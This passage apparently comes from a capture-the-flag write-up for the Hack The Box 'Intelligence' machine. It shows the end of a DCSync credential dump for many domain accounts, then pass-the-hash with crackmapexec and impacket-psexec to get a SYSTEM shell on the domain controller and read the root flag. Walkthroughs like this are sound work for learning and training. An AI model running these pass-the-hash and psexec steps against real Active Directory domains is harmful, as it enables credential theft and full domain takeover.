intelligence.htb\Thomas.Hall:aes128-cts-hmac-sha1-96:92689a74b9c5049685c1eab8191d1059
intelligence.htb\Thomas.Hall:des-cbc-md5:c1689415d0b349cd
intelligence.htb\Brian.Baker:aes256-cts-hmac-sha1-96:af4bde66e34333e9ac6347e990683a204449b35d59d16799890aa7373379a209
intelligence.htb\Brian.Baker:aes128-cts-hmac-sha1-96:2091fe2a67c3112abf4d86341b08a020
intelligence.htb\Brian.Baker:des-cbc-md5:20854cb0bf7f08cb
intelligence.htb\Richard.Williams:aes256-cts-hmac-sha1-96:39d20f1d098b0d11c76d46c796a00e485ccdb75888ab21a5e8ad48d9c43a9f99
intelligence.htb\Richard.Williams:aes128-cts-hmac-sha1-96:62051aea798dac4b50a7473bdf819357
intelligence.htb\Richard.Williams:des-cbc-md5:f78554f740a8fd37
intelligence.htb\Teresa.Williamson:aes256-cts-hmac-sha1-96:953ba46a1f1ab8452af44b430ccfbefd6aa365ce3c8472a6b69703a61ab9f852
intelligence.htb\Teresa.Williamson:aes128-cts-hmac-sha1-96:dd78207d6785612eb9f82041229b9115
intelligence.htb\Teresa.Williamson:des-cbc-md5:64e925a40408dae9
intelligence.htb\David.Wilson:aes256-cts-hmac-sha1-96:694ece7501043ef160eb03387f6a307821325720c8bacad867f9ecd450728080
intelligence.htb\David.Wilson:aes128-cts-hmac-sha1-96:55363f7a6a44fa20d0e5a11194effce9
intelligence.htb\David.Wilson:des-cbc-md5:ec16c87f6e23c89b
intelligence.htb\Darryl.Harris:aes256-cts-hmac-sha1-96:a84f076f19ce91192267337b3d193925f994f1b33da20b39e90da2fba7071bdd
intelligence.htb\Darryl.Harris:aes128-cts-hmac-sha1-96:e5725af1790497d9674a6b5a3c58994b
intelligence.htb\Darryl.Harris:des-cbc-md5:0bfe23d3e6d668c4
intelligence.htb\William.Lee:aes256-cts-hmac-sha1-96:ad8cf538481b64edf9df94e5fa9db14b2df9dc9bbbb4a505f8d576b30b6068dd
intelligence.htb\William.Lee:aes128-cts-hmac-sha1-96:0f468f9c3a56be7173331778c3b61a22
intelligence.htb\William.Lee:des-cbc-md5:237083ea75b0a1a2
intelligence.htb\Thomas.Wise:aes256-cts-hmac-sha1-96:a3a513ffaba7ff91bb4b0c96bea6d891ba8ab7fd45e260c8369d91a01c74b6e7
intelligence.htb\Thomas.Wise:aes128-cts-hmac-sha1-96:9027d42b650d6f3d98d0d31a713fd6d1
intelligence.htb\Thomas.Wise:des-cbc-md5:a76de0fba7892ce6
intelligence.htb\Veronica.Patel:aes256-cts-hmac-sha1-96:c7841eb0f843a15d0868c416e8f02e638400c0b789f861e5f126e41da7f5804d
intelligence.htb\Veronica.Patel:aes128-cts-hmac-sha1-96:065c8b582be8b0fd944b9db1ed6523ed
intelligence.htb\Veronica.Patel:des-cbc-md5:73a12af8d954f794
intelligence.htb\Joel.Crawford:aes256-cts-hmac-sha1-96:ba65147177659d607593ee0d4db39f83eb03d33955d64f690db82db793fbde42
intelligence.htb\Joel.Crawford:aes128-cts-hmac-sha1-96:7e1bce51c6b4cb73bdff47d0a54e3854
intelligence.htb\Joel.Crawford:des-cbc-md5:da806716e3a7106d
intelligence.htb\Jean.Walter:aes256-cts-hmac-sha1-96:97b7305619dba3d3f68f028860831335a6e86617a6a91cb4fad5ce25f7b5103f
intelligence.htb\Jean.Walter:aes128-cts-hmac-sha1-96:342909445b423a96346d786cf8e0750b
intelligence.htb\Jean.Walter:des-cbc-md5:f4ecbcb50e92155d
intelligence.htb\Anita.Roberts:aes256-cts-hmac-sha1-96:e4391edabdb89fe6fb3fe65c291299adbf1e4fd4fed15db38a1033986697a9d0
intelligence.htb\Anita.Roberts:aes128-cts-hmac-sha1-96:f894501ce29399a462da02f2df2af106
intelligence.htb\Anita.Roberts:des-cbc-md5:d902c791dfb9a4d3
intelligence.htb\Brian.Morris:aes256-cts-hmac-sha1-96:d8636a754109f191f067818da6420b3441d95457d1e31df5d9cd05a0eec4b65e
intelligence.htb\Brian.Morris:aes128-cts-hmac-sha1-96:45a0da625e5283ee353d10d25140f31a
intelligence.htb\Brian.Morris:des-cbc-md5:df2f2cd5d5e58f6d
intelligence.htb\Daniel.Shelton:aes256-cts-hmac-sha1-96:00f5f28e941558ba6c1bcc4fb674b50785633510c10b265e56a611f8845f2aba
intelligence.htb\Daniel.Shelton:aes128-cts-hmac-sha1-96:d14fb2ad083d60ed0ac0b5d12c5bc24d
intelligence.htb\Daniel.Shelton:des-cbc-md5:8643b991cdf1c146
intelligence.htb\Jessica.Moody:aes256-cts-hmac-sha1-96:ceec226b171f795b66c965a2e50c22a939d6b36102245c0e01e8d6cc45791e7b
intelligence.htb\Jessica.Moody:aes128-cts-hmac-sha1-96:2192e448419e2fb019b929e0ad7fbbef
intelligence.htb\Jessica.Moody:des-cbc-md5:fe9434706d0b674c
intelligence.htb\Tiffany.Molina:aes256-cts-hmac-sha1-96:fd72395eff4e22dfd26752c2648b6fa45331662abf917fe5b38d5ec578ad2271
intelligence.htb\Tiffany.Molina:aes128-cts-hmac-sha1-96:eee1655069dc004e3118634907c6a689
intelligence.htb\Tiffany.Molina:des-cbc-md5:37cde5134acba76b
intelligence.htb\James.Curbow:aes256-cts-hmac-sha1-96:aa40673df918aa36bf90bd7a6022f9a223ae2d2c2b54429bf1cb61a152a78ff8
intelligence.htb\James.Curbow:aes128-cts-hmac-sha1-96:ee89e49bea0fbc792be16d4d4cf1cf9d
intelligence.htb\James.Curbow:des-cbc-md5:f40ea738f76e1397
intelligence.htb\Jeremy.Mora:aes256-cts-hmac-sha1-96:c66ae8416b999d44c5b1a8cd945bae0d6ea86e7891f1f190c2d1da34b7dc6eaa
intelligence.htb\Jeremy.Mora:aes128-cts-hmac-sha1-96:757159175f1741317bfce199ec749b00
intelligence.htb\Jeremy.Mora:des-cbc-md5:a1865bd957797038
intelligence.htb\Jason.Patterson:aes256-cts-hmac-sha1-96:d2360bcbf255e5226485b07e0a2e66e94bb296a3deac0b8c7ef0419ac9cbbe52
intelligence.htb\Jason.Patterson:aes128-cts-hmac-sha1-96:4524a326d3ee31b4900576e44bdb52bf
intelligence.htb\Jason.Patterson:des-cbc-md5:80a7f1b36de0adda
intelligence.htb\Laura.Lee:aes256-cts-hmac-sha1-96:06edfbbd11c97570ec8d951f7aebeafebc0b507515457a3118d2ff905ec3c00f
intelligence.htb\Laura.Lee:aes128-cts-hmac-sha1-96:2f6b685dbe4a2ab6dba9caf12cc6dfcd
intelligence.htb\Laura.Lee:des-cbc-md5:6b25230d340292e6
intelligence.htb\Ted.Graves:aes256-cts-hmac-sha1-96:6907d00169d3f89abd23c79b51faee5dd59c591c8fec2558f83015fac59d407a
intelligence.htb\Ted.Graves:aes128-cts-hmac-sha1-96:fb439de8ecc244dcbd303248227bb9d0
intelligence.htb\Ted.Graves:des-cbc-md5:57bf52aba4f757a1
DC$:aes256-cts-hmac-sha1-96:c27bb1a3158218c35e222537de0d304e6bb6027bdce859736d325cae7d3e5d95
DC$:aes128-cts-hmac-sha1-96:0cac3fb4501085e92e3aa4deb2a2780c
DC$:des-cbc-md5:9808f8618cd31cd5
svc_int$:aes256-cts-hmac-sha1-96:a90da9b1d3dff35359ccd55cad2d218057cb8d13cd4feca8a34df44cbfb9e61b
svc_int$:aes128-cts-hmac-sha1-96:e17e370a4030f67428f7046f065e60eb
svc_int$:des-cbc-md5:a8588c70e3e043ba
[*] Cleaning up...
```


We have successfully performed a DCSync attack and dumped credentials.

From the output we are able to see that the Domain Administrator's hash is there:\
`Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::`

We can use this to authenticate to the domain controller. First let's validate that we are able to perform pass-the-hash and attempt to authenticate as the Domain Administrator to the SMB Service. 

```bash
0x3ds@kali $ crackmapexec smb 10.129.235.228 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3'

SMB   10.129.235.228   445    DC   [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)

SMB   10.129.235.228   445    DC   [+] intelligence.htb\Administrator:9075113fe16cf74f7c0f9b27e882dad3 (Pwn3d!)
```

We can see that it was successful and that we also have access to the `ADMIN$` share, allowing us to utilise the `impacket-psexec` tool to authenticate to the domain controller and obtain a shell as the `SYSTEM` account.

```bash
0x3ds@kali $ impacket-psexec intelligence.htb/administrator@dc.intelligence.htb -hashes 'aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file FGbGigQY.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service GsTq on dc.intelligence.htb.....
[*] Starting service GsTq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

We can see that we have successfully authenticated and now have a shell on the domain controller.

We can confirm that we have a shell as the `SYSTEM` account.

```shell
C:\Windows\system32> whoami

nt authority\system
```

And *voila*, we have a shell as the `SYSTEM` user!

We can now perform post exploitation activities and enumerate the domain controller further.

Upon further enumeration, we are able to locate the `root.txt` flag in the `C:\Users\Administrator\Desktop` directory.

```shell
C:\Windows\system32> dir C:\Users\Administrator\Desktop

 Volume in drive C has no label.
 Volume Serial Number is E3EF-EBBD

 Directory of C:\Users\Administrator\Desktop

04/18/2021  05:51 PM    <DIR>          .
04/18/2021  05:51 PM    <DIR>          ..
10/21/2025  01:09 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   5,954,158,592 bytes free
```

We can attempt to read the contents of this file and obtain the flag.

```shell
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt

711de***************************
```

From this we have been able to successfully obtain the `root.txt` flag!

> **Answer: `711de***************************`**
{: .prompt-tip }



